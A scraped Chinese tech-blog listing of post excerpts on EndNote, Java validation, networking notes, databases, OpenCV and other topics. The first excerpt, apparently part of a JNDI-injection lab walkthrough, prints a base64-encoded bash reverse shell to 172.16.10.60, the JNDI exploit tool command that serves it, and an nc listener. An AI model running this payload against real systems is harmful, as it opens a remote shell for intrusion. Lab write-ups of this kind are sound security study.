bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTAuNjAvMzQ1NiAwPiYx}|{base64,-d}|{bash,-i} 然后在kali上利用大佬的工具（JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar）来启动ldap和web服务
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTAuNjAvMzQ1NiAwPiYx}|{base64,-d}|{bash,-i}" -A "172.16.10.60" 新开启一个kali窗口监听
nc -lvvnp 3456 访问http://172.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d821b91adcc41411c3466842d4fd93eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99d77e81336de904225ff52f710900e0/" rel="bookmark">
			EndNote X9 在 Word 中嵌入 参考文献格式 全网最详细介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		EndNote X9: 如何用 Endnote X9 插入文献以及调整参考文献格式？ - 实验方法 - 丁香通
注意：进行下面步骤的前提是你已经安装了 EndNote 一、用EndNote X9创建库 安装好之后，第一次打开EndNote，会显示如下的界面：
可能会和我的不一样，我是都不同意后的界面！
1、某个盘新建一个文件夹来存放，我保存的位置是E:\...\EndNote Library\，EndNote Library是我在E盘下新建的文件夹， 2、选择 EndNote 中的那个” file -&gt; new”，创建一个新的库, 位置在我们上面的文件夹中，此时，会弹出如下的文件框：
点击 打开-&gt;保存 就好了，可以打开这个文件夹，例如，我打开EndNote Library文件夹，里面有EndNote生成的两个东东，如下：
此时，EndNote 的库已经创建好了。要怎么使用呢？继续看下面的。刚才 Create a new library 之后，弄好了库的位置，EndNote的界面显示如下：
二、查找并添加期刊对应的参考文献格式 我的理解是，每个论文上面都有参考文献的信息，比如日期、作者、发布期刊的名字等，当我们给一个特定的 参考文献格式，endnote 会自动帮我们提取这些信息；
EndNote本身就自带了很多期刊的格式文件，如果没有你要投的期刊的格式文件的话，就要你自己找了。
其实不用在网上找别人的下载，endnot官网就有所有的格式：Output Styles | EndNote
我们打开官网，如下：
选择 download 下面的 output stytles, 输入期刊的名字： sensors, 点击 search, 便可以看到下面的期刊名字！
点击最右边的下载，找到格式文件之后，要把格式文件放到 EndNote 安装目录下的 Styles文件夹下。
注意啦：是安装目录，不是刚才的库目录 ，放好后如下图所示：
注意这个地方：有时候这个期刊找不到，比如GPS solution, 是因为 GPS Solution 这个期刊属于 Springer 这个大的类，就是说很多期刊的格式是一致的，需要看他的大类是什么，这个地方需要注意哦！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99d77e81336de904225ff52f710900e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d17196dfef916e13dfede7b0a21d7b9b/" rel="bookmark">
			@Validated注解详解，分组校验，嵌套校验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简述
1、@Validation是一套帮助我们继续对传输的参数进行数据校验的注解，通过配置Validation可以很轻松的完成对数据的约束。
2、@Validated作用在类、方法和参数上
@Target({ElementType.TYPE, ElementType.METHOD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Validated {
Class&lt;?&gt;[] value() default {};
}
错误的状态码
错误的状态码
返回的响应码推荐使用400 bad request.
所有参数注解含义
@Valid和@Validated 区别： @Valid：没有分组的功能。
@Valid：可以用在方法、构造函数、方法参数和成员属性（字段）上
@Validated：提供了一个分组功能，可以在入参验证时，根据不同的分组采用不同的验证机制
@Validated：可以用在类型、方法和方法参数上。但是不能用在成员属性（字段）上
两者是否能用于成员属性（字段）上直接影响能否提供嵌套验证的功能
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc8ddfee36ace321b8afe2b6229a771c/" rel="bookmark">
			HCIP相关笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
OSI七层参考模型
获取目标MAC地址的方法：
封装和解封装
1.获取IP地址：（1）手工获取 （2）通过DHCP自动获取
2.打开浏览器，在浏览器中的地址栏上输入需要访问的服务器的 URL （资源定位符） 1.HDLC
2.PPP
2.认证阶段
3，网络层协议协商阶段----NCP （网络控制协议）协商----IPCP 协议
4&gt;配置：
四、GRE MGRE
1.GRE---通用路由封装技术（缺点：可拓展性差）
（1）GRE的配置：
&lt;1&gt; 创建隧道接口：
&lt;2&gt; 隧道接口配置IP地址：
&lt;3&gt; 定义封装方式：
&lt;4&gt; 定义封装内容：
2.MGRE---多点通用路由封装协议
（1）MGRE配置中心：
分支：
在MGRE环境下使用RIP获取未知网段路由的信息：
五、OSPF---开放式最短路径优先协议---无类别路由协议
1.OSPF的数据包类型：
2.OSPF状态机：
2-way（双向通信）---标志着邻居关系的建立
3.OSPF工作过程：
4.OSPF的基本配置
结构突变：
5.OSPF数据包
（1）HELLO包，DBD包，LSR包，LSU包，LSACK包
（2）HELLO包---周期性发现，建立，保活邻居关系。DR/BDR选举。
（3）DBD包---数据库描述报文---1.使用未携带数据的DBD包进行主从关系选举；2.使用携带数据的DBD包进行目录共享
（4）LSR---链路状态请求报文
（5）LSU---链路状态更新报文---真正携带LSA信息的数据包
​编辑（6）LSACK---链路状态确认报文
6.OSPF接口网络类型---指的是OSPF接口在不同的网络类型下的默认的工作方式
7.OSPF不规则区域
8.多进程双向重发布
9.OSPF的LSA
（1）LSA---链路状态通告---OSPF协议在不同网络下产生的用于携带和传递不同的信息。
（2）LSA的组成：
（3）LSA头部：
（4）分类：
HCIP---华为认证体系下高级网络工程师
抽象语言-------电信号 的过程
抽象语言-----编码
编码--------二进制
二进制-----电信号
处理电信号
OSI七层参考模型 OSI---------------Open System Interconnect(开放式系统互联参考模型)
1979年由ISO组织（国际标准化组织） 颁布的OSI
【第一台电子计算机---1946.2.14
1876----贝尔获得电话专利】
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc8ddfee36ace321b8afe2b6229a771c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38e7ea6a25de750cd24b934a170f2509/" rel="bookmark">
			什么是枚举【详解】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本期介绍🍖
主要介绍：什么是枚举，枚举是如何定义、初始化的，以及枚举到底如何使用，还有枚举这种语法存在的优点有那些👀。
文章目录 一、什么是枚举🍖二、枚举类型的定义🍖三、枚举的使用🍖四、枚举的优点🍖 一、什么是枚举🍖 在C/C++中枚举是一个被命名的整型常数的集合。在实际应用中我们经常把能够且便于一一列举的类型用枚举来表示。就比如：一周的星期、性别、月份……
二、枚举类型的定义🍖 枚举类型的定义与结构体类似，不同在于结构体每个成员之间是用；隔开的，而枚举成员之间却是用，分隔。如下所示：
enum Color { Red, Yellow, Blue }; 其中enum为枚举类型的关键字，enum Color为枚举的类型，而{}中的内容为枚举类型可能的取值，也称为：枚举常量。这些可能的取值都是有值的，在未初始化的情况下，默认从0开始依次递增1。当然我们可以在其定义的时候初始化一些值，而那些未初始化的部分会从最后一个初始化数开始向后依次递增1。如下所示：
三、枚举的使用🍖 注意：在给枚举变量赋值的时候，只能用枚举常量（也就是这里的Red、Yellow、Blue），不能使用这些常量所对应的值（也就是0、1、2），否则会由于类型的差异而导致编译不过的情况。
四、枚举的优点🍖 我们其实可以使用#define定义常量，为什么非要使用枚举？
增加代码的可读性和可移植性与#define定义的标识符相比，枚举常量更加严谨（因为枚举类型具有类型检查）防止命名污染便于调试（#define定义的标识符在编译期间就会被全部替换掉，是无法在调试时准确监视到的，但枚举却可以）使用方便，可以一次定义多个常量 这份博客👍如果对你有帮助，给博主一个免费的点赞以示鼓励欢迎各位🔎点赞👍评论收藏⭐️，谢谢！！！
如果有什么疑问或不同的见解，欢迎评论区留言欧👀。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f8e476c9dff7ff2846c43396246286d/" rel="bookmark">
			自动驾驶路径规划——基于MATLAB的栅格地图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
1.什么是栅格地图？
1.1栅格地图用于路径规划的优势：
2.MATLAB栅格地图的绘制 MATLAB代码
声明
前言 这个学期学校开设了相应的课程，同时也在学习古月居机器人学系列的《基于栅格地图的机器人路径规划指南》，为了巩固知识，方便自己的学习与整理，遂以学习笔记的形式记录。
另附一些其他博主写的文章：
基于栅格地图的路径规划（一）基于Matlab二维、三维栅格地图的构建 路径规划（一）：使用Matlab快速绘制栅格地图
python栅格地图上路径规划作图
1.什么是栅格地图？ 栅格图像，也称光栅图像，是指在空间和亮度上都已经离散化了的图像。我们可以把一幅栅格图像考虑为一个矩阵，矩阵中的任一元素对应于图像中的一个点，而相应的值对应于该点的灰度级（灰度图），数字矩阵中的元素叫做像素。机器人学中地图的表示方法有四种：特征地图、拓扑地图、栅格地图以及直接表征法（Appearance Based Methods）。
特征地图用有关的几何特征（如点、直线、面）表示环境。
​ 栅格地图则是把环境划分成一系列栅格，其中每一栅格给定一个可能值，表示该栅格被占据的概率。
栅格地图、特征地图以及点云地图又被称为尺度地图，常用于地图构建、定位、SLAM、小规模的路径规划。
拓扑地图把室内环境表示为带结点和相关连接线的拓扑结构图，其中结点表示环境中的重要位置点（拐角、门、电梯、楼梯等），边表示结点间的连接关系，如走廊等。拓扑地图不具备真实的物理尺寸，只表示不同地点的连通关系和距离。
直接表征法省去了特征或栅格表示这一中间环节，直接用传感器读取的数据来构造机器人的位姿空间。每种方法各有自己的特点和适用范围，其中特征地图和栅格地图应用最普遍。 此外还有语义地图，通过加上标签的方式进行描述，如M楼位于学子路的东侧。语义地图常用于人机交互。
1.1栅格地图用于路径规划的优势： 1.可以将任意形状轮廓的地图，用足够精细的栅格进行绘制；
2.每一个栅格，可以通过不同颜色表征不同含义，如黑色代表障碍物、黄色代表起点、红色代表终点。
3.基于栅格地图进行路径规划有横、纵、斜三个规划方向，对于室内低速机器人可以完全按照规划路径行走；对于中高速机器人，可以考虑将规划路径进行平滑处理，以适用于非完全约束系统。
2.MATLAB栅格地图的绘制 MATLAB绘制栅格地图的几个核心函数及思想：
1.colormap:为栅格地图创建自定义颜色。如黄色栅格代表起点、红色栅格代表终点、黑色栅格代表障碍物。
颜色
double 或 single RGB 三元组
uint8 RGB 三元组
黄色
[1 1 0]
[255 255 0]
品红色
[1 0 1]
[255 0 255]
青蓝色
[0 1 1]
[0 255 255]
红色
[1 0 0]
[255 0 0]
绿色
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f8e476c9dff7ff2846c43396246286d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b44ff6d9baa96044e675813c5220f143/" rel="bookmark">
			数据库安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据库软件安装 安装包解压 Windows环境：Windows环境中，如果安装包不是.exe的格式，而是压缩包，需要先对压缩包进行解压，右键解压缩即可。
Linux环境：iso后缀的文件，需要对文件进行挂载，命令如下：
mount -o loop /opt/dmsetup/dm8_20220305_x86_kylin10_64_ent_8.1.2.114.iso /opt/dmsetup/
Windows环境安装 运行安装程序 解压后，双击“setup.exe”安装程序后可根据系统配置选择相应语言与时区，点击“确定”按钮继续安装。
欢迎页面 点击“下一步”，开始安装
许可证协议 在安装和使用之前，该安装程序需要用户阅读许可协议条款，用户如接受该协议，则选中“接受”，并点击“下一步”继续安装；用户若选中“不接受”，将无法进行安装。
验证Key文件 点击“浏览”按钮，选取Key文件，安装程序将自动验证Key文件信息。如果是合法的Key文件且在有效期内，用户可以点击“下一步”继续安装。
选择安装组件 数据库软件安装程序提供四种安装方式：“典型安装”、“服务器安装”、“客户端安装”和“自定义安装”，用户可根据实际情况灵活地选择。
一般情况下给客户安装需要去掉服务器和数据库服务
选择安装目录 根据前期规划，指定安装路径。安装路径里的目录名由英文字母、数字和下划线等组成，不建议使用包含空格和中文字符的路径等。
安装前小结 显示即将进行的安装的有关信息，例如产品名称、版本信息、安装类型、安装目录、可用空间、可用内存等信息，用户检查无误后点击“安装”按钮进行软件的安装
完成安装 点击“完成”，完成数据库安装。
Linux环境安装-命令行 先切换到dmdba用户
执行安装命令 在终端进入到安装程序所在文件夹，执行以下命令行安装：
[dmdba@~]# /opt/dmsetup/DMInstall.bin -i 选择安装语言 根据系统配置选择相应语言，输入选项，回车进行下一步。如下所示： 请选择安装语言(C/c:中文 E/e:英文) [C/c]：C 解压安装程序.......... 欢迎使用达梦数据库安装程序 验证key文件 可以选择是否输入Key文件路径。不输入则进入下一步安装，输入Key文件路径，安装程序将显示Key文件的详细信息，如果是合法的Key文件且在有效期内，可以继续安装。如下所示：
是否输入Key文件路径? (Y/y:是 N/n:否) [Y/y]：Y 请输入Key文件的路径地址 [dm.key]：/opt/dmsetup/dm.key 有效日期: 2020-12-25 服务器颁布类型: 企业版 发布类型: 试用版 用户名称: 武汉达梦公司疫情期间临时授权 授权用户数: 无限制 并发连接数: 无限制 输入时区 可以选择的时区信息。如下所示：
是否设置时区? (Y/y:是 N/n:否) [Y/y]:Y 设置时区: [ 1]: GTM-12=日界线西 [ 2]: GTM-11=萨摩亚群岛 [ 3]: GTM-10=夏威夷 [ 4]: GTM-09=阿拉斯加 [ 5]: GTM-08=太平洋时间（美国和加拿大） [ 6]: GTM-07=亚利桑那 [ 7]: GTM-06=中部时间（美国和加拿大） [ 8]: GTM-05=东部部时间（美国和加拿大） [ 9]: GTM-04=大西洋时间（美国和加拿大） [10]: GTM-03=巴西利亚 [11]: GTM-02=中大西洋 [12]: GTM-01=亚速尔群岛 [13]: GTM=格林威治标准时间 [14]: GTM+01=萨拉热窝 [15]: GTM+02=开罗 [16]: GTM+03=莫斯科 [17]: GTM+04=阿布扎比 [18]: GTM+05=伊斯兰堡 [19]: GTM+06=达卡 [20]: GTM+07=曼谷，河内 [21]: GTM+08=中国标准时间 [22]: GTM+09=汉城 [23]: GTM+10=关岛 [24]: GTM+11=所罗门群岛 [25]: GTM+12=斐济 [26]: GTM+13=努库阿勒法 [27]: GTM+14=基里巴斯 请选择设置时区 [21]:21 选择安装类型 数据库软件安装程序提供四种安装方式：“典型安装”、“服务器安装”、“客户端安装”和“自定义安装”，用户可根据实际情况灵活地选择。生产环境可以根据实际需求选择，一般情况下选择"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b44ff6d9baa96044e675813c5220f143/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b074340aad850889a5544d5925253c72/" rel="bookmark">
			验证UDP端口是否开放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于业务所需，要用UDP对接对方主机的一个端口，正常情况下我们大家都会想到telnet，但是在实际中使用会发现无法测试通过UDP开的端口会提示超时或失败。
这时候可以使用nc命令来进行验证，如下：
[root@test1 ~]# nc -uvz 192.168.0.125 111
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.0.125:111.
Ncat: UDP packet sent successfully
Ncat: 1 bytes sent, 0 bytes received in 2.04 seconds.
这就是代表成功了
找到了一个比较好的对于nc命令的介绍的文章，分享下
https://blog.csdn.net/GNNUXXL/article/details/122299540
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef3c8f6ca320bac90a9dc6d193632706/" rel="bookmark">
			selenium中的CSS定位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSS是一种语言，它被用来描述HTML和XML文档的表现。CSS使用选择器来为页面元素绑定属性。这些选择器可以被selenium用作另外的定位策略。
CSS选择器的常见语法：
语法说明*通用元素选择器，匹配任何元素E标签选择器，匹配所有使用 E 标签的元素.info class选择器，匹配所有 class 属性中包含 info 的元素#footerid 选择器，匹配所有 id 属性等于 footer 的元素E,F多元素选择器，同时匹配所有 E 元素或 F 元素，E 和 F 之间用逗号分隔E F后代元素选择器，匹配所有属于 E 元素后代的 F 元素，E 和 F 之间用空格分隔E &gt; F子元素选择器，匹配所有 E 元素的子元素 FE + F毗邻元素选择器，匹配紧随 E 元素之后的同级元素 F （只匹配第一个）E ~ F同级元素选择器，匹配所有在 E 元素之后的同级 F 元素E[att=‘val’]属性 att 的值为 val 的 E 元素 （区分大小写）E[att^=‘val’]属性 att 的值以 val 开头的 E 元素 （区分大小写）E[att$=‘val’]属性 att 的值以 val 结尾的 E 元素 （区分大小写）E[att*=‘val’]属性 att 的值包含 val 的 E 元素 （区分大小写）E[att1=‘v1’][att2*=‘v2’]属性 att1 的值为 v1，att2 的值包含 v2 （区分大小写）E:contains(‘xxxx’)内容中包含 xxxx 的 E 元素E:not(s)匹配不符合当前选择器的任何元元素 代码例子：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef3c8f6ca320bac90a9dc6d193632706/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/968df1a1e0b1ce76edad0f666b521582/" rel="bookmark">
			python：No matching distribution found for pprint
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装某模块出现问题：
不知道为什么这个模块安装总是有问题，其他帖子说可以换源试试。
然后换了一个安装的地址：
结果还是不行，报错了。。
后来发现要用https…（贴上正确的代码
下面展示一些 正确的代码。
pip install pandas -i https://pypi.douban.com/simple pandas 可换你想要的包 o.o
又是踩坑的一天呢
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/161e4d5b31a66e1503dc3653bde3dabf/" rel="bookmark">
			C&#43;&#43;单例模式的几种实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单例模式(Singleton Pattern)的概念 模式定义 保证一个类仅有一个实例，并提供一个访问它的全局访问点。
饿汉单例和懒汉单例 常见的单例模式有两个分支，饿汉单例和懒汉单例。
饿汉单例是指在程序初始化时就把单例对象创建出来。其优点是当要使用对象时可以直接获取，缺点是无论对象有没有被调用，都会被创建出来占据内存。懒汉单例是指当单例对象第一次被调用时才创建对应对象。其优点是不被调用的对象将不被创建，缺点是创建对象时会花费较多的时间，导致第一次调用的特殊性，且对象创建时是线程不安全的。 使用建议：
应当采用饿汉单例，将单例对象的初始化直接放在主线程的开头位置执行。
这样做有很多好处，首先保证创建对象时不会产生竞争条件(race condition)，使得代码编写起来简单、清晰（如果不在主线程创建好，则要考虑多个线程同时创建对象，此时需要通过互斥量等手段加以限制，虽然C++11的static关键字可以确保只创建一个对象，但依然不推荐这么使用）；其次可以保证获取对象的时间是固定的，不会像懒汉模式那样第一次调用会花费额外的时间。
单例模式的实现 1、最基本的饿汉单例模式的实现 #include &lt;iostream&gt; class SingletonClass { public: //单例对象的全局访问点 static SingletonClass* getInstance() { if (m_pInstance == nullptr) { m_pInstance = new SingletonClass(); return m_pInstance; } std::cout &lt;&lt; "对象的地址为 " &lt;&lt; m_pInstance &lt;&lt; std::endl; return m_pInstance; } //销毁单例对象 static void destoryInstance() { delete m_pInstance; //即使单例对象没有被真正创建，但在定义时为其赋值nullptr了，因此直接delete是不会存在问题的 m_pInstance = nullptr; return; } private: //构造函数 SingletonClass() { std::cout &lt;&lt; "SingletonClass的单例对象被创建" &lt;&lt; std::endl; } //析构函数 ~SingletonClass() { std::cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/161e4d5b31a66e1503dc3653bde3dabf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f9c43039fe0f5e1a351994ac18dcd27/" rel="bookmark">
			OpenCV——图像轮廓
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们的目标：
能够掌握轮廓查找与绘制的方法
能够掌握轮廓面积及长度的计算方法
能够编程实现形状匹配
能够掌握轮廓的几何形状拟合方法
任务一 凸包绘制 案例一 获取凸包 import cv2
# 读取图片并转至灰度模式
img = cv2.imread('contours2.png', 1)
gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
# 二值化
ret, binary = cv2.threshold(gray, 127, 255, cv2.THRESH_BINARY)
# 图片轮廓
contours, hierarchy = cv2.findContours(binary,cv2.RETR_LIST,cv2.CHAIN_APPROX_NONE)
cnt = contours[0]
# 寻找凸包并绘制凸包（轮廓）
hull = cv2.convexHull(cnt)
cv2.polylines(img,[hull],True,(255,0,0),2)
# 显示图片
cv2.imshow('line', img)
cv2.waitKey()
cv2.destroyAllWindows()
练习：实物凸包检测 import cv2
# 读取图片并转至灰度模式
img = cv2.imread('hand.png', 1)
gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
# 二值化
ret, binary = cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f9c43039fe0f5e1a351994ac18dcd27/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/698b6d3cf0d14557ba7fa95e70921c39/" rel="bookmark">
			WSL安装桌面面并通过XLaunch访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考
为什么需要桌面 有些时候，使用图形界面可以方便我们的开发（比如使用cmake-gui），所以为WSL安装图形界面是有实际价值的，并且可以通过XLaunch远程连接桌面。
安装过程 1、安装XLaunch
XLaunch
直接默认安装即可。
2、WSL安装必要软件
//先更新apt-get sudo apt-get update &amp;&amp; sudo apt-get upgrade -y //安装XFCE桌面环境 sudo apt-get install xfce4 -y //将必要软件安装到XFCE桌面 sudo apt-get install xfce4-goodies -y 3、配置X-Launch
打开X-Launch软件，选择One large window, Display number选择0
然后就是疯狂的下一步，直到出现黑色窗口。
4、为WSL添加环境变量
//这个0和Display number选择0 是对应的 export DISPLAY=localhost:0 //要更新下环境变量才能立即生效 source /etc/profile //打开xfce4,以后每次使用时需要输入此命令 startxfce4 成功打开之后之前的黑色屏幕上就会变成xfce4桌面环境。如下图所示
之后每次使用，只要先进行第3步，再进行第4步即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db9556c257b20aea03f3a16a56b07e9e/" rel="bookmark">
			比较器和运算放大器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		比较器概念 比较器是通过比较两个输入端的电流或电压的大小，在输出端输出不同电压结果的一种电子元件。
输入端接的是模拟信号，输出端输出是的数字信号（0和1），所以输出的信号要么是高电平要么就是低电平。
比较器原理 因为运放开路增益非常大，两个输入端就算是微小的差异，也会获得极大的输出，导致输出直接饱和（saturation）的状态
选择其中一个输入端作为参考点（REF)来进行比较，（如下图），选择反相输入端作为参考，当正相端V1大于V2时，Vout输出高电平，当V1小于V2时，Vout输出低电平。
看下比较器的Datasheet(规格书），下图是LM339的输出端的电路结构，内部方框图:
图中我们可以看出比较器的输出端是个OC门，也就是说它的集电极是开路的，这样大家应该就知道前面说的高低电平如何确定了吧，OC输出也就是说它的集电极是悬空的，它的上面需要接一个上拉电阻，如下图所示：
（OC输出：即OC门，又称集电极开路门，Open Collector，是集电极开路的一种输出结构）
从上图可以看出，假如输出的是一个高电平，那么这个高电平就是等于上拉电阻R1的VCC电压，低电平电压就是等于地（0V）。
即：当V1大于V2时，Vout输出高电平，多高吗？等于15V;
当V1小于V2时，Vout输出低电平，多低吗？等于0V;
所以，可以根据自已实际设计的电路需要来选择合适的上拉电压VCC，从而来达到输出高电平的一个电压；例如需要输出5V则将输出端上拉到5V，而低电平则由比较器的地（GND)决定，这就涉及比较器的单电源还是双电源供电问题了，低电平电压就等于比较器的负电源电压。
单电源供电（如下图）
双电源供电（如下图）
从单电源和双电源的供电方式对比我们知道，单电源负电压供电是接地的；而双电源它是接了一个负压的；
所以，综上所述：当你不需要输出负电压时，就选择单电源供电，如果你需要输出负电压时就选择双电源供电。
02总结：
1、根据输出是否需要负电压来选择供电方式（不需要负压选择单电源供电，需要负压选择双电源供电）。
2、当比较器正相输入端电压大于反相输入端电压时，输出为高电平。
3、当比较器正相输入端电压小于反相输入端电压时，输出为低电平。
单限比较器 我们可以将某一个输入端连接参考电压UREF，另一端连接待测电压uI，即可比较参考电压与待测电压的大小。参考电压就是输出电压由高电平变为低电平，或者由低电平变为高电平跃变的阈值。此电路只存在一个阈值电压，被称为单限比较器。
图 两种单限比较器与电压传输特性
滞回比较器 在单限比较器中，输入电压在阈值电压附近的任何微小变化，都会引起输出电压的跃变。不管这种微小变化是来源于输入电压还是来源于外部干扰。因此，虽然单限比较器很灵敏，但是抗干扰能力差。在单限比较器中加入正反馈，反相输入端接输入电压，可以做成滞回比较器。它具有惯性，看上去反应比较“慢”，对微小变化不敏感，有一定的抗干扰能力，因此称为滞回比较器。
比较器和运算放大器的区别 从内部图可以看出运算放大器和比较器的差别在于输出电路。运算放大器采用双晶体管推挽输出，而比较器只用一只晶体管，集电极连到输出端，发射极接地。
比较器需要外接一个从正电源端到输出端的上拉电阻，该上拉电阻相当于晶体管的集电极电阻。
运算放大器可用于线性放大电路（负反馈），也可用于非线性信号电压比较（开环或正反馈）。
电压比较器只能用于信号电压比较，不能用于线性放大电路（比较器没有频率补偿） 。
两者都可以用于做信号电压比较，但比较器被设计为高速开关，它有比运算放大器更快的转换速率和更短的延时。
运放和电压比较器的本质区别 （1）放大器与比较器的主要区别是闭环特性! 放大器大都工作在闭环状态,所以要求闭环后不能自激 . 而比较器大都工作在开环状态更追求速度 . 对于频率比较低的情况放大器完全可以代替比较器(要主意输出电平),反过来比较器大部分情况不能当作放大器使用 .
（2）比较器就是运放的开环应用 但比较器的设计是针对电压门限比较而用的，要求的比较门限精确，比较后的输出边沿上升或下降时间要短，输出符合 TTL/CMOS 电平 / 或 OC 等，不要求中间环节的准确度，同时驱动能力也不一样。一般情况：用运放做比较器，多数达不到满幅输出，或比较后的边沿时间过长，因此设计中少用运放做比较器为佳。
运放和比较器的区别 比较器和运放虽然在电路图上符号相同，但这两种器件确有非常大的区别，一般不可以互换，区别如下: 1、比较器的翻转速度快，大约在 ns 数量级，而运放翻转速度一般为 us 数量级(特殊的高速运放除外)。
2、运放可以接入负反馈电路，而比较器则不能使用负反馈，虽然比较器也有同相和反相两个输入端，但因为其内部没有相位补偿电路，所以，如果接入负反馈，电路不能稳定工作。内部无相位补偿电路，这也是比较器比运放速度快很多的主要原因。
3、运放输出级一般采用推挽电路，双极性输出。而多数比较器输出级为集电极开路结构，所以需要上拉电阻，单极性输出，容易和数字电路连接。
（3）比较器(LM339 和 LM393)输出是集电极开路(OC)结构, 需要上拉电阻才能有对外输出电流的能力 . 而运放输出级是推挽的结构, 有对称的拉电流和灌电流能力 . 另外比较器为了加快响应速度, 中间级很少, 也没有内部的频率补偿 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db9556c257b20aea03f3a16a56b07e9e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9312c140cc82dc90565cb635539ef99/" rel="bookmark">
			Flutter入门-Flutter配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flutter配置 后续会持续补充更新…
修改Android SDK配置 1、全局修改
比如我的Flutter3.3.0，适配的android构建版本是31，兼容版本是16～31。
如果想要修改最低兼容版本，找到该文件进行修改，注意，这种修改是应用到全局的，也就是说我们以后新建的所有flutter项目都是按照这个来构建生产android代码的。
2、针对性修改
如果我们只针对某个项目，修改兼容版本，可以在生成的gradle文件中进行修改。
建议针对性的修改。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e41dd3e6e803e2069ed9e795385ec77/" rel="bookmark">
			Python:利用if-elif编写一个逢7拍手的小游戏（附带知识点&#43;详细注释）初学python的小伙伴快点看过来
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 条件： 1.1~100之间的数字 2.是否是7的倍数/包含7 3.判断是否是7的倍数 代码： #知识点 #1.range()可以创建一个整数列表，一般用于for循环当中 #2.if-elif语句： #if 判断条件： # 代码段1 #elif: # 代码段2 for i in range(1,101): if "7" in str(i) or i%7==0: print("*",end="、") elif "7" not in str(i) and i%7!=0: print(i,end="、") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4eef517508db4825297835327fc9c0d9/" rel="bookmark">
			postgresql 计算时间差的秒数、天数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 处理时间时用到了，记录一下。
时间差天数 select '2017-12-10'::date - '2017-11-01'::date; 时间差秒数 select extract(epoch FROM (now() - (now()-interval '1 day') )); select trunc(extract(epoch FROM (now() - (now()-interval '1 day') ))::numeric); select trunc(extract(epoch FROM (now() - (now()-interval '1 day') ))::numeric,1); select round(extract(epoch FROM (now() - (now()-interval '1 day') ))::numeric); select round(extract(epoch FROM (now() - (now()-interval '1 day') ))::numeric,1); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3733047a7e655768d7f856c158bb3cbd/" rel="bookmark">
			使用JVM工具：HSDB查看动态代理生成的代理类
			</a>
		</h2>
